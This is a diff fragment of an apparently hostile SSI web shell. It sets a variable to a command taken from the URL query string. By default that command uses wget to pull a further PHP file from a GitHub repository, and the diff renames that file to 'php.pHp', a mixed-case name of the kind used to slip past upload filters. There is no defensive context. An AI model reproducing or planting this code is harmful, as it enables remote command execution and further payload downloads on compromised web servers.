@@ -4,7 +4,7 @@
 <!--#config errmsg="Error / Webnya Ga Support SSI Command"-->
 <!--#set var="zero" value="" -->
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="wget https://github.com/janda354311/tes/raw/master/lock_lock21.php" -->
+<!--#set var="shl" value="wget https://github.com/janda354311/tes/raw/master/php.pHp" -->
 <!--#else -->
 <!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
